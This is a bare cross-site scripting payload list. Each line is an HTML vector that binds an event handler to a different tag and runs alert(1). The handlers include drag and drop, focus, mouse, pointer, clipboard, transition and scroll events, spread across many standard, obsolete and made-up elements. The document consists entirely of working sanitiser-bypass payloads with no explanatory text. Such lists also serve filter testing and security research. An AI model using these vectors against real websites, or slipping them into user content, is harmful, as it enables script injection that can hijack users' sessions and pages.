<div draggable="true" contenteditable>drag me</div><frame ondrop=alert(1) contenteditable style=display:block>drop here</frame>
<div draggable="true" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable style=display:block>drop here</frameset>
<div draggable="true" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable style=display:block>drop here</frameset>
<div draggable="true" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable style=display:block>drop here</h1>
<div draggable="true" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable style=display:block>drop here</h1>
<div draggable="true" contenteditable>drag me</div><head ondragover=alert(1) contenteditable style=display:block>drop here</head>
<div draggable="true" contenteditable>drag me</div><head ondrop=alert(1) contenteditable style=display:block>drop here</head>
<div draggable="true" contenteditable>drag me</div><header ondragover=alert(1) contenteditable style=display:block>drop here</header>
<div draggable="true" contenteditable>drag me</div><header ondrop=alert(1) contenteditable style=display:block>drop here</header>
<div draggable="true" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable style=display:block>drop here</hgroup>
<div draggable="true" contenteditable>drag me</div><hgroup ondrop=alert(1) contenteditable style=display:block>drop here</hgroup>
<div draggable="true" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable style=display:block>drop here</hr>
<div draggable="true" contenteditable>drag me</div><hr ondrop=alert(1) contenteditable style=display:block>drop here</hr>
<div draggable="true" contenteditable>drag me</div><html ondragover=alert(1) contenteditable style=display:block>drop here</html>
<div draggable="true" contenteditable>drag me</div><html ondrop=alert(1) contenteditable style=display:block>drop here</html>
<div draggable="true" contenteditable>drag me</div><i ondragover=alert(1) contenteditable style=display:block>drop here</i>
<div draggable="true" contenteditable>drag me</div><i ondrop=alert(1) contenteditable style=display:block>drop here</i>
<div draggable="true" contenteditable>drag me</div><iframe ondragover=alert(1) contenteditable style=display:block>drop here</iframe>
<div draggable="true" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable style=display:block>drop here</iframe>
<div draggable="true" contenteditable>drag me</div><iframe2 ondragover=alert(1) contenteditable style=display:block>drop here</iframe2>
<div draggable="true" contenteditable>drag me</div><iframe2 ondrop=alert(1) contenteditable style=display:block>drop here</iframe2>
<div draggable="true" contenteditable>drag me</div><image ondragover=alert(1) contenteditable style=display:block>drop here</image>
<div draggable="true" contenteditable>drag me</div><image ondrop=alert(1) contenteditable style=display:block>drop here</image>
<div draggable="true" contenteditable>drag me</div><image2 ondragover=alert(1) contenteditable style=display:block>drop here</image2>
<div draggable="true" contenteditable>drag me</div><image2 ondrop=alert(1) contenteditable style=display:block>drop here</image2>
<div draggable="true" contenteditable>drag me</div><image3 ondragover=alert(1) contenteditable style=display:block>drop here</image3>
<div draggable="true" contenteditable>drag me</div><image3 ondrop=alert(1) contenteditable style=display:block>drop here</image3>
<div draggable="true" contenteditable>drag me</div><img ondragover=alert(1) contenteditable style=display:block>drop here</img>
<div draggable="true" contenteditable>drag me</div><img ondrop=alert(1) contenteditable style=display:block>drop here</img>
<div draggable="true" contenteditable>drag me</div><img2 ondragover=alert(1) contenteditable style=display:block>drop here</img2>
<div draggable="true" contenteditable>drag me</div><img2 ondrop=alert(1) contenteditable style=display:block>drop here</img2>
<div draggable="true" contenteditable>drag me</div><input ondragover=alert(1) contenteditable style=display:block>drop here</input>
<div draggable="true" contenteditable>drag me</div><input ondrop=alert(1) contenteditable style=display:block>drop here</input>
<div draggable="true" contenteditable>drag me</div><input2 ondragover=alert(1) contenteditable style=display:block>drop here</input2>
<div draggable="true" contenteditable>drag me</div><input2 ondrop=alert(1) contenteditable style=display:block>drop here</input2>
<div draggable="true" contenteditable>drag me</div><input3 ondragover=alert(1) contenteditable style=display:block>drop here</input3>
<div draggable="true" contenteditable>drag me</div><input3 ondrop=alert(1) contenteditable style=display:block>drop here</input3>
<div draggable="true" contenteditable>drag me</div><input4 ondragover=alert(1) contenteditable style=display:block>drop here</input4>
<div draggable="true" contenteditable>drag me</div><input4 ondrop=alert(1) contenteditable style=display:block>drop here</input4>
<div draggable="true" contenteditable>drag me</div><ins ondragover=alert(1) contenteditable style=display:block>drop here</ins>
<div draggable="true" contenteditable>drag me</div><ins ondrop=alert(1) contenteditable style=display:block>drop here</ins>
<div draggable="true" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable style=display:block>drop here</kbd>
<div draggable="true" contenteditable>drag me</div><kbd ondrop=alert(1) contenteditable style=display:block>drop here</kbd>
<div draggable="true" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable style=display:block>drop here</keygen>
<div draggable="true" contenteditable>drag me</div><keygen ondrop=alert(1) contenteditable style=display:block>drop here</keygen>
<div draggable="true" contenteditable>drag me</div><label ondragover=alert(1) contenteditable style=display:block>drop here</label>
<div draggable="true" contenteditable>drag me</div><label ondrop=alert(1) contenteditable style=display:block>drop here</label>
<div draggable="true" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable style=display:block>drop here</legend>
<div draggable="true" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable style=display:block>drop here</legend>
<div draggable="true" contenteditable>drag me</div><li ondragover=alert(1) contenteditable style=display:block>drop here</li>
<div draggable="true" contenteditable>drag me</div><li ondrop=alert(1) contenteditable style=display:block>drop here</li>
<div draggable="true" contenteditable>drag me</div><link ondragover=alert(1) contenteditable style=display:block>drop here</link>
<div draggable="true" contenteditable>drag me</div><link ondrop=alert(1) contenteditable style=display:block>drop here</link>
<div draggable="true" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable style=display:block>drop here</listing>
<div draggable="true" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable style=display:block>drop here</listing>
<div draggable="true" contenteditable>drag me</div><main ondragover=alert(1) contenteditable style=display:block>drop here</main>
<div draggable="true" contenteditable>drag me</div><main ondrop=alert(1) contenteditable style=display:block>drop here</main>
<div draggable="true" contenteditable>drag me</div><map ondragover=alert(1) contenteditable style=display:block>drop here</map>
<div draggable="true" contenteditable>drag me</div><map ondrop=alert(1) contenteditable style=display:block>drop here</map>
<div draggable="true" contenteditable>drag me</div><mark ondragover=alert(1) contenteditable style=display:block>drop here</mark>
<div draggable="true" contenteditable>drag me</div><mark ondrop=alert(1) contenteditable style=display:block>drop here</mark>
<div draggable="true" contenteditable>drag me</div><marquee ondragover=alert(1) contenteditable style=display:block>drop here</marquee>
<div draggable="true" contenteditable>drag me</div><marquee ondrop=alert(1) contenteditable style=display:block>drop here</marquee>
<div draggable="true" contenteditable>drag me</div><menu ondragover=alert(1) contenteditable style=display:block>drop here</menu>
<div draggable="true" contenteditable>drag me</div><menu ondrop=alert(1) contenteditable style=display:block>drop here</menu>
<div draggable="true" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable style=display:block>drop here</menuitem>
<div draggable="true" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable style=display:block>drop here</menuitem>
<div draggable="true" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable style=display:block>drop here</meta>
<div draggable="true" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable style=display:block>drop here</meta>
<div draggable="true" contenteditable>drag me</div><meter ondragover=alert(1) contenteditable style=display:block>drop here</meter>
<div draggable="true" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable style=display:block>drop here</meter>
<div draggable="true" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable style=display:block>drop here</multicol>
<div draggable="true" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable style=display:block>drop here</multicol>
<div draggable="true" contenteditable>drag me</div><nav ondragover=alert(1) contenteditable style=display:block>drop here</nav>
<div draggable="true" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable style=display:block>drop here</nav>
<div draggable="true" contenteditable>drag me</div><nextid ondragover=alert(1) contenteditable style=display:block>drop here</nextid>
<div draggable="true" contenteditable>drag me</div><nextid ondrop=alert(1) contenteditable style=display:block>drop here</nextid>
<div draggable="true" contenteditable>drag me</div><nobr ondragover=alert(1) contenteditable style=display:block>drop here</nobr>
<div draggable="true" contenteditable>drag me</div><nobr ondrop=alert(1) contenteditable style=display:block>drop here</nobr>
<div draggable="true" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable style=display:block>drop here</noembed>
<div draggable="true" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable style=display:block>drop here</noembed>
<div draggable="true" contenteditable>drag me</div><noframes ondragover=alert(1) contenteditable style=display:block>drop here</noframes>
<div draggable="true" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable style=display:block>drop here</noframes>
<div draggable="true" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable style=display:block>drop here</noscript>
<div draggable="true" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable style=display:block>drop here</noscript>
<div draggable="true" contenteditable>drag me</div><object ondragover=alert(1) contenteditable style=display:block>drop here</object>
<div draggable="true" contenteditable>drag me</div><object ondrop=alert(1) contenteditable style=display:block>drop here</object>
<div draggable="true" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable style=display:block>drop here</ol>
<div draggable="true" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable style=display:block>drop here</ol>
<div draggable="true" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable style=display:block>drop here</optgroup>
<div draggable="true" contenteditable>drag me</div><optgroup ondrop=alert(1) contenteditable style=display:block>drop here</optgroup>
<div draggable="true" contenteditable>drag me</div><option ondragover=alert(1) contenteditable style=display:block>drop here</option>
<div draggable="true" contenteditable>drag me</div><option ondrop=alert(1) contenteditable style=display:block>drop here</option>
<div draggable="true" contenteditable>drag me</div><output ondragover=alert(1) contenteditable style=display:block>drop here</output>
<div draggable="true" contenteditable>drag me</div><output ondrop=alert(1) contenteditable style=display:block>drop here</output>
<div draggable="true" contenteditable>drag me</div><p ondragover=alert(1) contenteditable style=display:block>drop here</p>
<div draggable="true" contenteditable>drag me</div><p ondrop=alert(1) contenteditable style=display:block>drop here</p>
<div draggable="true" contenteditable>drag me</div><param ondragover=alert(1) contenteditable style=display:block>drop here</param>
<div draggable="true" contenteditable>drag me</div><param ondrop=alert(1) contenteditable style=display:block>drop here</param>
<div draggable="true" contenteditable>drag me</div><picture ondragover=alert(1) contenteditable style=display:block>drop here</picture>
<div draggable="true" contenteditable>drag me</div><picture ondrop=alert(1) contenteditable style=display:block>drop here</picture>
<div draggable="true" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable style=display:block>drop here</plaintext>
<div draggable="true" contenteditable>drag me</div><plaintext ondrop=alert(1) contenteditable style=display:block>drop here</plaintext>
<div draggable="true" contenteditable>drag me</div><pre ondragover=alert(1) contenteditable style=display:block>drop here</pre>
<div draggable="true" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable style=display:block>drop here</pre>
<div draggable="true" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable style=display:block>drop here</progress>
<div draggable="true" contenteditable>drag me</div><progress ondrop=alert(1) contenteditable style=display:block>drop here</progress>
<div draggable="true" contenteditable>drag me</div><q ondragover=alert(1) contenteditable style=display:block>drop here</q>
<div draggable="true" contenteditable>drag me</div><q ondrop=alert(1) contenteditable style=display:block>drop here</q>
<div draggable="true" contenteditable>drag me</div><rb ondragover=alert(1) contenteditable style=display:block>drop here</rb>
<div draggable="true" contenteditable>drag me</div><rb ondrop=alert(1) contenteditable style=display:block>drop here</rb>
<div draggable="true" contenteditable>drag me</div><rp ondragover=alert(1) contenteditable style=display:block>drop here</rp>
<div draggable="true" contenteditable>drag me</div><rp ondrop=alert(1) contenteditable style=display:block>drop here</rp>
<div draggable="true" contenteditable>drag me</div><rt ondragover=alert(1) contenteditable style=display:block>drop here</rt>
<div draggable="true" contenteditable>drag me</div><rt ondrop=alert(1) contenteditable style=display:block>drop here</rt>
<div draggable="true" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable style=display:block>drop here</rtc>
<div draggable="true" contenteditable>drag me</div><rtc ondrop=alert(1) contenteditable style=display:block>drop here</rtc>
<div draggable="true" contenteditable>drag me</div><ruby ondragover=alert(1) contenteditable style=display:block>drop here</ruby>
<div draggable="true" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable style=display:block>drop here</ruby>
<div draggable="true" contenteditable>drag me</div><s ondragover=alert(1) contenteditable style=display:block>drop here</s>
<div draggable="true" contenteditable>drag me</div><s ondrop=alert(1) contenteditable style=display:block>drop here</s>
<div draggable="true" contenteditable>drag me</div><samp ondragover=alert(1) contenteditable style=display:block>drop here</samp>
<div draggable="true" contenteditable>drag me</div><samp ondrop=alert(1) contenteditable style=display:block>drop here</samp>
<div draggable="true" contenteditable>drag me</div><script ondragover=alert(1) contenteditable style=display:block>drop here</script>
<div draggable="true" contenteditable>drag me</div><script ondrop=alert(1) contenteditable style=display:block>drop here</script>
<div draggable="true" contenteditable>drag me</div><section ondragover=alert(1) contenteditable style=display:block>drop here</section>
<div draggable="true" contenteditable>drag me</div><section ondrop=alert(1) contenteditable style=display:block>drop here</section>
<div draggable="true" contenteditable>drag me</div><select ondragover=alert(1) contenteditable style=display:block>drop here</select>
<div draggable="true" contenteditable>drag me</div><select ondrop=alert(1) contenteditable style=display:block>drop here</select>
<div draggable="true" contenteditable>drag me</div><set ondragover=alert(1) contenteditable style=display:block>drop here</set>
<div draggable="true" contenteditable>drag me</div><set ondrop=alert(1) contenteditable style=display:block>drop here</set>
<div draggable="true" contenteditable>drag me</div><shadow ondragover=alert(1) contenteditable style=display:block>drop here</shadow>
<div draggable="true" contenteditable>drag me</div><shadow ondrop=alert(1) contenteditable style=display:block>drop here</shadow>
<div draggable="true" contenteditable>drag me</div><slot ondragover=alert(1) contenteditable style=display:block>drop here</slot>
<div draggable="true" contenteditable>drag me</div><slot ondrop=alert(1) contenteditable style=display:block>drop here</slot>
<div draggable="true" contenteditable>drag me</div><small ondragover=alert(1) contenteditable style=display:block>drop here</small>
<div draggable="true" contenteditable>drag me</div><small ondrop=alert(1) contenteditable style=display:block>drop here</small>
<div draggable="true" contenteditable>drag me</div><source ondragover=alert(1) contenteditable style=display:block>drop here</source>
<div draggable="true" contenteditable>drag me</div><source ondrop=alert(1) contenteditable style=display:block>drop here</source>
<div draggable="true" contenteditable>drag me</div><spacer ondragover=alert(1) contenteditable style=display:block>drop here</spacer>
<div draggable="true" contenteditable>drag me</div><spacer ondrop=alert(1) contenteditable style=display:block>drop here</spacer>
<div draggable="true" contenteditable>drag me</div><span ondragover=alert(1) contenteditable style=display:block>drop here</span>
<div draggable="true" contenteditable>drag me</div><span ondrop=alert(1) contenteditable style=display:block>drop here</span>
<div draggable="true" contenteditable>drag me</div><strike ondragover=alert(1) contenteditable style=display:block>drop here</strike>
<div draggable="true" contenteditable>drag me</div><strike ondrop=alert(1) contenteditable style=display:block>drop here</strike>
<div draggable="true" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable style=display:block>drop here</strong>
<div draggable="true" contenteditable>drag me</div><strong ondrop=alert(1) contenteditable style=display:block>drop here</strong>
<div draggable="true" contenteditable>drag me</div><style ondragover=alert(1) contenteditable style=display:block>drop here</style>
<div draggable="true" contenteditable>drag me</div><style ondrop=alert(1) contenteditable style=display:block>drop here</style>
<div draggable="true" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable style=display:block>drop here</sub>
<div draggable="true" contenteditable>drag me</div><sub ondrop=alert(1) contenteditable style=display:block>drop here</sub>
<div draggable="true" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable style=display:block>drop here</summary>
<div draggable="true" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable style=display:block>drop here</summary>
<div draggable="true" contenteditable>drag me</div><sup ondragover=alert(1) contenteditable style=display:block>drop here</sup>
<div draggable="true" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable style=display:block>drop here</sup>
<div draggable="true" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable style=display:block>drop here</svg>
<div draggable="true" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable style=display:block>drop here</svg>
<div draggable="true" contenteditable>drag me</div><table ondragover=alert(1) contenteditable style=display:block>drop here</table>
<div draggable="true" contenteditable>drag me</div><table ondrop=alert(1) contenteditable style=display:block>drop here</table>
<div draggable="true" contenteditable>drag me</div><tbody ondragover=alert(1) contenteditable style=display:block>drop here</tbody>
<div draggable="true" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable style=display:block>drop here</tbody>
<div draggable="true" contenteditable>drag me</div><td ondragover=alert(1) contenteditable style=display:block>drop here</td>
<div draggable="true" contenteditable>drag me</div><td ondrop=alert(1) contenteditable style=display:block>drop here</td>
<div draggable="true" contenteditable>drag me</div><template ondragover=alert(1) contenteditable style=display:block>drop here</template>
<div draggable="true" contenteditable>drag me</div><template ondrop=alert(1) contenteditable style=display:block>drop here</template>
<div draggable="true" contenteditable>drag me</div><textarea ondragover=alert(1) contenteditable style=display:block>drop here</textarea>
<div draggable="true" contenteditable>drag me</div><textarea ondrop=alert(1) contenteditable style=display:block>drop here</textarea>
<div draggable="true" contenteditable>drag me</div><tfoot ondragover=alert(1) contenteditable style=display:block>drop here</tfoot>
<div draggable="true" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable style=display:block>drop here</tfoot>
<div draggable="true" contenteditable>drag me</div><th ondragover=alert(1) contenteditable style=display:block>drop here</th>
<div draggable="true" contenteditable>drag me</div><th ondrop=alert(1) contenteditable style=display:block>drop here</th>
<div draggable="true" contenteditable>drag me</div><thead ondragover=alert(1) contenteditable style=display:block>drop here</thead>
<div draggable="true" contenteditable>drag me</div><thead ondrop=alert(1) contenteditable style=display:block>drop here</thead>
<div draggable="true" contenteditable>drag me</div><time ondragover=alert(1) contenteditable style=display:block>drop here</time>
<div draggable="true" contenteditable>drag me</div><time ondrop=alert(1) contenteditable style=display:block>drop here</time>
<div draggable="true" contenteditable>drag me</div><title ondragover=alert(1) contenteditable style=display:block>drop here</title>
<div draggable="true" contenteditable>drag me</div><title ondrop=alert(1) contenteditable style=display:block>drop here</title>
<div draggable="true" contenteditable>drag me</div><tr ondragover=alert(1) contenteditable style=display:block>drop here</tr>
<div draggable="true" contenteditable>drag me</div><tr ondrop=alert(1) contenteditable style=display:block>drop here</tr>
<div draggable="true" contenteditable>drag me</div><track ondragover=alert(1) contenteditable style=display:block>drop here</track>
<div draggable="true" contenteditable>drag me</div><track ondrop=alert(1) contenteditable style=display:block>drop here</track>
<div draggable="true" contenteditable>drag me</div><tt ondragover=alert(1) contenteditable style=display:block>drop here</tt>
<div draggable="true" contenteditable>drag me</div><tt ondrop=alert(1) contenteditable style=display:block>drop here</tt>
<div draggable="true" contenteditable>drag me</div><u ondragover=alert(1) contenteditable style=display:block>drop here</u>
<div draggable="true" contenteditable>drag me</div><u ondrop=alert(1) contenteditable style=display:block>drop here</u>
<div draggable="true" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable style=display:block>drop here</ul>
<div draggable="true" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable style=display:block>drop here</ul>
<div draggable="true" contenteditable>drag me</div><var ondragover=alert(1) contenteditable style=display:block>drop here</var>
<div draggable="true" contenteditable>drag me</div><var ondrop=alert(1) contenteditable style=display:block>drop here</var>
<div draggable="true" contenteditable>drag me</div><video ondragover=alert(1) contenteditable style=display:block>drop here</video>
<div draggable="true" contenteditable>drag me</div><video ondrop=alert(1) contenteditable style=display:block>drop here</video>
<div draggable="true" contenteditable>drag me</div><video2 ondragover=alert(1) contenteditable style=display:block>drop here</video2>
<div draggable="true" contenteditable>drag me</div><video2 ondrop=alert(1) contenteditable style=display:block>drop here</video2>
<div draggable="true" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable style=display:block>drop here</wbr>
<div draggable="true" contenteditable>drag me</div><wbr ondrop=alert(1) contenteditable style=display:block>drop here</wbr>
<div draggable="true" contenteditable>drag me</div><xmp ondragover=alert(1) contenteditable style=display:block>drop here</xmp>
<div draggable="true" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable style=display:block>drop here</xmp>
<div draggable="true" ondrag="alert(1)" style=display:block>test</div>
<div draggable="true" ondragend="alert(1)" style=display:block>test</div>
<div draggable="true" ondragenter="alert(1)" style=display:block>test</div>
<div draggable="true" ondragleave="alert(1)" style=display:block>test</div>
<div draggable="true" ondragstart="alert(1)" style=display:block>test</div>
<div id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></div>
<div id=x tabindex=1 onfocus=alert(1)></div>
<div id=x tabindex=1 onfocusin=alert(1)></div>
<div onafterscriptexecute=alert(1)><script>1</script>
<div onbeforecopy="alert(1)" contenteditable>test</div>
<div onbeforecut="alert(1)" contenteditable>test</div>
<div onbeforescriptexecute=alert(1)><script>1</script>
<div onblur=alert(1) id=x tabindex=1 style=display:block>test</div><input value=clickme>
<div onclick="alert(1)" style=display:block>test</div>
<div oncontextmenu="alert(1)" style=display:block>test</div>
<div oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<div oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<div ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</div>
<div onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</div><input value=clickme>
<div onkeydown="alert(1)" contenteditable style=display:block>test</div>
<div onkeypress="alert(1)" contenteditable style=display:block>test</div>
<div onkeyup="alert(1)" contenteditable style=display:block>test</div>
<div onmousedown="alert(1)" style=display:block>test</div>
<div onmouseenter="alert(1)" style=display:block>test</div>
<div onmouseleave="alert(1)" style=display:block>test</div>
<div onmousemove="alert(1)" style=display:block>test</div>
<div onmouseout="alert(1)" style=display:block>test</div>
<div onmouseover="alert(1)" style=display:block>test</div>
<div onmouseup="alert(1)" style=display:block>test</div>
<div onmousewheel=alert(1) style=display:block>requires scrolling
<div onpaste="alert(1)" contenteditable>test</div>
<div onpointerdown=alert(1) style=display:block>XSS</div>
<div onpointerenter=alert(1) style=display:block>XSS</div>
<div onpointerleave=alert(1) style=display:block>XSS</div>
<div onpointermove=alert(1) style=display:block>XSS</div>
<div onpointerout=alert(1) style=display:block>XSS</div>
<div onpointerover=alert(1) style=display:block>XSS</div>
<div onpointerrawupdate=alert(1) style=display:block>XSS</div>
<div onpointerup=alert(1) style=display:block>XSS</div>
<div onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></div>
<dl contenteditable onbeforeinput=alert(1)>test
<dl draggable="true" ondrag="alert(1)" style=display:block>test</dl>
<dl draggable="true" ondragend="alert(1)" style=display:block>test</dl>
<dl draggable="true" ondragenter="alert(1)" style=display:block>test</dl>
<dl draggable="true" ondragleave="alert(1)" style=display:block>test</dl>
<dl draggable="true" ondragstart="alert(1)" style=display:block>test</dl>
<dl id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></dl>
<dl id=x tabindex=1 onfocus=alert(1)></dl>
<dl id=x tabindex=1 onfocusin=alert(1)></dl>
<dl onafterscriptexecute=alert(1)><script>1</script>
<dl onbeforecopy="alert(1)" contenteditable>test</dl>
<dl onbeforecut="alert(1)" contenteditable>test</dl>
<dl onbeforescriptexecute=alert(1)><script>1</script>
<dl onblur=alert(1) id=x tabindex=1 style=display:block>test</dl><input value=clickme>
<dl onclick="alert(1)" style=display:block>test</dl>
<dl oncontextmenu="alert(1)" style=display:block>test</dl>
<dl oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<dl oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<dl ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</dl>
<dl onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</dl><input value=clickme>
<dl onkeydown="alert(1)" contenteditable style=display:block>test</dl>
<dl onkeypress="alert(1)" contenteditable style=display:block>test</dl>
<dl onkeyup="alert(1)" contenteditable style=display:block>test</dl>
<dl onmousedown="alert(1)" style=display:block>test</dl>
<dl onmouseenter="alert(1)" style=display:block>test</dl>
<dl onmouseleave="alert(1)" style=display:block>test</dl>
<dl onmousemove="alert(1)" style=display:block>test</dl>
<dl onmouseout="alert(1)" style=display:block>test</dl>
<dl onmouseover="alert(1)" style=display:block>test</dl>
<dl onmouseup="alert(1)" style=display:block>test</dl>
<dl onmousewheel=alert(1) style=display:block>requires scrolling
<dl onpaste="alert(1)" contenteditable>test</dl>
<dl onpointerdown=alert(1) style=display:block>XSS</dl>
<dl onpointerenter=alert(1) style=display:block>XSS</dl>
<dl onpointerleave=alert(1) style=display:block>XSS</dl>
<dl onpointermove=alert(1) style=display:block>XSS</dl>
<dl onpointerout=alert(1) style=display:block>XSS</dl>
<dl onpointerover=alert(1) style=display:block>XSS</dl>
<dl onpointerrawupdate=alert(1) style=display:block>XSS</dl>
<dl onpointerup=alert(1) style=display:block>XSS</dl>
<dl onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></dl>
<dt contenteditable onbeforeinput=alert(1)>test
<dt draggable="true" ondrag="alert(1)" style=display:block>test</dt>
<dt draggable="true" ondragend="alert(1)" style=display:block>test</dt>
<dt draggable="true" ondragenter="alert(1)" style=display:block>test</dt>
<dt draggable="true" ondragleave="alert(1)" style=display:block>test</dt>
<dt draggable="true" ondragstart="alert(1)" style=display:block>test</dt>
<dt id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></dt>
<dt id=x tabindex=1 onfocus=alert(1)></dt>
<dt id=x tabindex=1 onfocusin=alert(1)></dt>
<dt onafterscriptexecute=alert(1)><script>1</script>
<dt onbeforecopy="alert(1)" contenteditable>test</dt>
<dt onbeforecut="alert(1)" contenteditable>test</dt>
<dt onbeforescriptexecute=alert(1)><script>1</script>
<dt onblur=alert(1) id=x tabindex=1 style=display:block>test</dt><input value=clickme>
<dt onclick="alert(1)" style=display:block>test</dt>
<dt oncontextmenu="alert(1)" style=display:block>test</dt>
<dt oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<dt oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<dt ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</dt>
<dt onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</dt><input value=clickme>
<dt onkeydown="alert(1)" contenteditable style=display:block>test</dt>
<dt onkeypress="alert(1)" contenteditable style=display:block>test</dt>
<dt onkeyup="alert(1)" contenteditable style=display:block>test</dt>
<dt onmousedown="alert(1)" style=display:block>test</dt>
<dt onmouseenter="alert(1)" style=display:block>test</dt>
<dt onmouseleave="alert(1)" style=display:block>test</dt>
<dt onmousemove="alert(1)" style=display:block>test</dt>
<dt onmouseout="alert(1)" style=display:block>test</dt>
<dt onmouseover="alert(1)" style=display:block>test</dt>
<dt onmouseup="alert(1)" style=display:block>test</dt>
<dt onmousewheel=alert(1) style=display:block>requires scrolling
<dt onpaste="alert(1)" contenteditable>test</dt>
<dt onpointerdown=alert(1) style=display:block>XSS</dt>
<dt onpointerenter=alert(1) style=display:block>XSS</dt>
<dt onpointerleave=alert(1) style=display:block>XSS</dt>
<dt onpointermove=alert(1) style=display:block>XSS</dt>
<dt onpointerout=alert(1) style=display:block>XSS</dt>
<dt onpointerover=alert(1) style=display:block>XSS</dt>
<dt onpointerrawupdate=alert(1) style=display:block>XSS</dt>
<dt onpointerup=alert(1) style=display:block>XSS</dt>
<dt onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></dt>
<element contenteditable onbeforeinput=alert(1)>test
<element draggable="true" ondrag="alert(1)" style=display:block>test</element>
<element draggable="true" ondragend="alert(1)" style=display:block>test</element>
<element draggable="true" ondragenter="alert(1)" style=display:block>test</element>
<element draggable="true" ondragleave="alert(1)" style=display:block>test</element>
<element draggable="true" ondragstart="alert(1)" style=display:block>test</element>
<element id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></element>
<element id=x tabindex=1 onfocus=alert(1)></element>
<element id=x tabindex=1 onfocusin=alert(1)></element>
<element onafterscriptexecute=alert(1)><script>1</script>
<element onbeforecopy="alert(1)" contenteditable>test</element>
<element onbeforecut="alert(1)" contenteditable>test</element>
<element onbeforescriptexecute=alert(1)><script>1</script>
<element onblur=alert(1) id=x tabindex=1 style=display:block>test</element><input value=clickme>
<element onclick="alert(1)" style=display:block>test</element>
<element oncontextmenu="alert(1)" style=display:block>test</element>
<element oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<element oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<element ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</element>
<element onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</element><input value=clickme>
<element onkeydown="alert(1)" contenteditable style=display:block>test</element>
<element onkeypress="alert(1)" contenteditable style=display:block>test</element>
<element onkeyup="alert(1)" contenteditable style=display:block>test</element>
<element onmousedown="alert(1)" style=display:block>test</element>
<element onmouseenter="alert(1)" style=display:block>test</element>
<element onmouseleave="alert(1)" style=display:block>test</element>
<element onmousemove="alert(1)" style=display:block>test</element>
<element onmouseout="alert(1)" style=display:block>test</element>
<element onmouseover="alert(1)" style=display:block>test</element>
<element onmouseup="alert(1)" style=display:block>test</element>
<element onmousewheel=alert(1) style=display:block>requires scrolling
<element onpaste="alert(1)" contenteditable>test</element>
<element onpointerdown=alert(1) style=display:block>XSS</element>
<element onpointerenter=alert(1) style=display:block>XSS</element>
<element onpointerleave=alert(1) style=display:block>XSS</element>
